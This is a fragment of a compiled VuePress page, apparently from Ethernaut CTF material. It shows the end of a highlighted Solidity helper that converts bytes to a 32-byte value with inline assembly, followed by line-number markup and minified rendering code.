        <span class="token keyword">assembly</span> <span class="token punctuation">{</span>
            result <span class="token operator">:=</span> <span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> result<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,64);function m(y,w){const p=t("ExternalLinkIcon"),e=t("DocsAD");return c(),i("div",null,[k,n("h2",r,[d,s(),n("a",v,[s("EthernautCTF"),a(p)])]),a(e),b])}const g=o(u,[["render",m],["__file","openzeppelin.html.vue"]]);export{g as default};
